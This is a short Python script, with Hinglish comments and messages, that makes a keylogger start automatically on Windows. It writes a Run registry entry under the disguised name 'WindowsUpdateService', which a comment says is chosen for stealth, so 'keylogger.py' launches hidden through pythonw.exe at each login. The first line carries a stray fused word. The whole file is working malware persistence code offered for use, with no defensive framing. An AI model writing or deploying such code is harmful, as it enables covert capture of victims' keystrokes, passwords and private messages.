requirementimport os
import sys
import winreg as reg

def add_to_startup():
    app_name = "WindowsUpdateService"          # Normal naam (stealth ke liye)
    script_name = "keylogger.py"
    
    script_path = os.path.abspath(script_name)
    pythonw_path = os.path.join(sys.prefix, 'pythonw.exe')
    
    key_path = f'"{pythonw_path}" "{script_path}"'
    
    key = reg.HKEY_CURRENT_USER
    key_path_reg = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        reg_key = reg.OpenKey(key, key_path_reg, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, key_path)
        reg.CloseKey(reg_key)
        print("✅ Auto-start successfully added!")
        print("Ab laptop restart hone pe keylogger apne aap chalega.")
    except Exception as e:
        print(f"❌ Error: {e}")
        print("Run as Administrator try karo.")

if __name__ == "__main__":
    print("Setting up auto-start...")
    add_to_startup()
    input("Press Enter to exit...")
